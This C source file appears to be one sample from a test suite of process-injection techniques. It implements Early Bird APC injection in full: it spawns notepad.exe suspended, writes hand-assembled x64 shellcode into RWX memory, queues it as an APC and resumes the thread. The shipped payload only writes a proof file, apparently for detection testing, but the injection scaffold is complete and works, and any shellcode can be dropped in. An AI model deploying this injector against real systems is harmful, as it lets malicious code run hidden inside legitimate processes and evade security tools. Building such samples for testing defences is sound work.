// SAMPLE: g1_03 | Early Bird APC Injection | Group: Process Injection
//
// Description:
//   Creates a sacrificial process (notepad.exe) in a CREATE_SUSPENDED state,
//   allocates memory and writes machine code payload and parameters via WriteProcessMemory,
//   queues an Asynchronous Procedure Call (APC) to the main suspended thread via QueueUserAPC,
//   and resumes the thread via ResumeThread.
//   As the process initializes, the APC fires during early runtime alertable state,
//   executing the payload before main entrypoint.
//
// C1 Verification Rule:
//   Proof file MUST be written by the APC routine executing inside the target
//   process space before or during process startup. Injector main process does NOT write the proof.
//
// Compile (MinGW-w64):
//   x86_64-w64-mingw32-gcc -O2 -o g1_03_early_bird_apc.exe g1_03_early_bird_apc.c

#include "../shared/c1_proof.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#define SAMPLE_ID      "g1_03_early_bird_apc"
#define TECHNIQUE_NAME "EarlyBirdAPCInjection"

#define OFFSET_STUB       0x000
#define OFFSET_PARAMS     0x100
#define OFFSET_FILEPATH   0x200
#define OFFSET_PROOFSTR   0x300

typedef struct _REMOTE_PARAMS {
    UINT_PTR pfnCreateFileA;      // offset 0x00
    UINT_PTR pfnWriteFile;        // offset 0x08
    UINT_PTR pfnCloseHandle;      // offset 0x10
    UINT_PTR pfnExitThread;       // offset 0x18
    UINT_PTR pProofFilePath;      // offset 0x20
    UINT_PTR pProofString;        // offset 0x28
    DWORD    dwProofStringLen;    // offset 0x30
    DWORD    dwBytesWritten;      // offset 0x34
} REMOTE_PARAMS;

/*
 * Pure x64 machine code routine executed inside target process via QueueUserAPC.
 * For an APC routine, RCX receives the dwData parameter (which points to REMOTE_PARAMS).
 * The routine calls CreateFileA, WriteFile, CloseHandle, and returns cleanly so the thread can continue.
 *
 * Disassembly:
 *   sub rsp, 0x48
 *   mov rbx, rcx
 *   mov rcx, [rbx + 0x20]
 *   mov edx, 0x40000000
 *   xor r8d, r8d
 *   xor r9d, r9d
 *   mov dword ptr [rsp + 0x20], 2
 *   mov dword ptr [rsp + 0x28], 0x80
 *   mov qword ptr [rsp + 0x30], 0
 *   call [rbx]                        ; CreateFileA
 *   cmp rax, -1
 *   je exit_label
 *   mov r12, rax
 *   mov rcx, r12
 *   mov rdx, [rbx + 0x28]
 *   mov r8d, [rbx + 0x30]
 *   lea r9, [rbx + 0x34]
 *   mov qword ptr [rsp + 0x20], 0
 *   call [rbx + 0x08]                 ; WriteFile
 *   mov rcx, r12
 *   call [rbx + 0x10]                 ; CloseHandle
 * exit_label:
 *   add rsp, 0x48
 *   ret                               ; clean APC return to caller
 */
static const unsigned char g_ApcStubX64[] = {
    0x48, 0x83, 0xEC, 0x48,                         // sub rsp, 0x48
    0x48, 0x89, 0xCB,                               // mov rbx, rcx
    0x48, 0x8B, 0x4B, 0x20,                         // mov rcx, [rbx + 0x20] (filePath)
    0xBA, 0x00, 0x00, 0x00, 0x40,                   // mov edx, 0x40000000 (GENERIC_WRITE)
    0x45, 0x31, 0xC0,                               // xor r8d, r8d (share = 0)
    0x45, 0x31, 0xC9,                               // xor r9d, r9d (sec = NULL)
    0xC7, 0x44, 0x24, 0x20, 0x02, 0x00, 0x00, 0x00, // mov dword ptr [rsp + 0x20], 2 (CREATE_ALWAYS)
    0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00, // mov dword ptr [rsp + 0x28], 0x80 (NORMAL)
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, // mov qword ptr [rsp + 0x30], 0
    0xFF, 0x13,                                     // call [rbx] (pfnCreateFileA)
    0x48, 0x83, 0xF8, 0xFF,                         // cmp rax, -1
    0x74, 0x1F,                                     // je to exit (+0x1F bytes)
    0x49, 0x89, 0xC4,                               // mov r12, rax (hFile)
    0x4C, 0x89, 0xE1,                               // mov rcx, r12 (hFile)
    0x48, 0x8B, 0x53, 0x28,                         // mov rdx, [rbx + 0x28] (proofStr)
    0x44, 0x8B, 0x43, 0x30,                         // mov r8d, [rbx + 0x30] (strLen)
    0x4C, 0x8D, 0x4B, 0x34,                         // lea r9, [rbx + 0x34] (&bytesWritten)
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // mov qword ptr [rsp + 0x20], 0
    0xFF, 0x53, 0x08,                               // call [rbx + 0x08] (pfnWriteFile)
    0x4C, 0x89, 0xE1,                               // mov rcx, r12 (hFile)
    0xFF, 0x53, 0x10,                               // call [rbx + 0x10] (pfnCloseHandle)
    // exit:
    0x48, 0x83, 0xC4, 0x48,                         // add rsp, 0x48
    0xC3                                            // ret
};

static int format_c1_proof_string(const char *sample_id, const char *technique, char *out_buf, size_t buf_size)
{
    SYSTEMTIME st;
    FILETIME ft;
    GetSystemTime(&st);
    SystemTimeToFileTime(&st, &ft);
    uint64_t wt = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    uint64_t unix_ts = (wt - 116444736000000000ULL) / 10000000ULL;

    char chk_input[256];
    snprintf(chk_input, sizeof(chk_input), "%s|%llu", sample_id, (unsigned long long)unix_ts);
    uint32_t checksum = c1_crc32(chk_input, strlen(chk_input));

    return snprintf(out_buf, buf_size, "%s|%s|%llu|%08x\n",
                    sample_id, technique, (unsigned long long)unix_ts, checksum);
}

int main(void)
{
    printf("[*] Starting %s (%s)...\n", SAMPLE_ID, TECHNIQUE_NAME);

    // 1. Resolve kernel32 APIs
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) {
        fprintf(stderr, "[-] Failed to obtain kernel32.dll handle.\n");
        return EXIT_FAILURE;
    }

    UINT_PTR pfnCreateFileA = (UINT_PTR)GetProcAddress(hKernel32, "CreateFileA");
    UINT_PTR pfnWriteFile   = (UINT_PTR)GetProcAddress(hKernel32, "WriteFile");
    UINT_PTR pfnCloseHandle = (UINT_PTR)GetProcAddress(hKernel32, "CloseHandle");
    if (!pfnCreateFileA || !pfnWriteFile || !pfnCloseHandle) {
        fprintf(stderr, "[-] Failed to resolve required Win32 APIs from kernel32.\n");
        return EXIT_FAILURE;
    }

    // 2. Launch target process in CREATE_SUSPENDED state
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    char targetCmd[] = "notepad.exe";
    if (!CreateProcessA(NULL, targetCmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] Failed to spawn target process suspended: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    printf("[+] Target process spawned in SUSPENDED state (PID: %lu, handle: %p)\n",
           pi.dwProcessId, pi.hProcess);

    // 3. Allocate RWX buffer in suspended process
    const SIZE_T remoteAllocSize = 4096;
    LPVOID pRemoteBase = VirtualAllocEx(
        pi.hProcess,
        NULL,
        remoteAllocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteBase) {
        fprintf(stderr, "[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    printf("[+] Allocated remote memory in PID %lu at: 0x%p\n", pi.dwProcessId, pRemoteBase);

    // 4. Construct payload data
    char proofFilePath[] = C1_PROOF_PATH;
    char proofString[512] = {0};
    int proofLen = format_c1_proof_string(SAMPLE_ID, TECHNIQUE_NAME, proofString, sizeof(proofString));

    REMOTE_PARAMS params;
    memset(&params, 0, sizeof(params));
    params.pfnCreateFileA   = pfnCreateFileA;
    params.pfnWriteFile     = pfnWriteFile;
    params.pfnCloseHandle   = pfnCloseHandle;
    params.pfnExitThread    = 0;
    params.pProofFilePath   = (UINT_PTR)((BYTE *)pRemoteBase + OFFSET_FILEPATH);
    params.pProofString     = (UINT_PTR)((BYTE *)pRemoteBase + OFFSET_PROOFSTR);
    params.dwProofStringLen = (DWORD)proofLen;
    params.dwBytesWritten   = 0;

    // 5. Write stub and parameters into suspended target process
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, (BYTE *)pRemoteBase + OFFSET_STUB,
                       g_ApcStubX64, sizeof(g_ApcStubX64), &written);
    WriteProcessMemory(pi.hProcess, (BYTE *)pRemoteBase + OFFSET_PARAMS,
                       &params, sizeof(params), &written);
    WriteProcessMemory(pi.hProcess, (BYTE *)pRemoteBase + OFFSET_FILEPATH,
                       proofFilePath, sizeof(proofFilePath), &written);
    WriteProcessMemory(pi.hProcess, (BYTE *)pRemoteBase + OFFSET_PROOFSTR,
                       proofString, (SIZE_T)proofLen, &written);

    printf("[+] Injected APC execution stub and parameters into suspended target.\n");

    // 6. Queue APC to the suspended process main thread
    PAPCFUNC pApcRoutine = (PAPCFUNC)((BYTE *)pRemoteBase + OFFSET_STUB);
    ULONG_PTR apcData = (ULONG_PTR)((BYTE *)pRemoteBase + OFFSET_PARAMS);

    DWORD qResult = QueueUserAPC(pApcRoutine, pi.hThread, apcData);
    if (!qResult) {
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteBase, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    printf("[+] Early Bird APC successfully queued to main thread.\n");

    // 7. Resume the main thread to trigger APC delivery
    DWORD prevSuspendCount = ResumeThread(pi.hThread);
    if (prevSuspendCount == (DWORD)-1) {
        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteBase, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    printf("[+] Main thread resumed (prev suspend count: %lu). Waiting for APC delivery...\n",
           prevSuspendCount);

    // 8. Poll for proof file generation
    BOOL verified = FALSE;
    for (int i = 0; i < 50; i++) {
        Sleep(100);
        if (GetFileAttributesA(C1_PROOF_PATH) != INVALID_FILE_ATTRIBUTES) {
            verified = TRUE;
            break;
        }
    }

    // 9. Cleanup
    VirtualFreeEx(pi.hProcess, pRemoteBase, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (!verified) {
        fprintf(stderr, "[-] Proof file %s not found after Early Bird APC execution!\n", C1_PROOF_PATH);
        return EXIT_FAILURE;
    }

    printf("[+] Early Bird APC injection executed successfully. Proof verified.\n");
    return EXIT_SUCCESS;
}
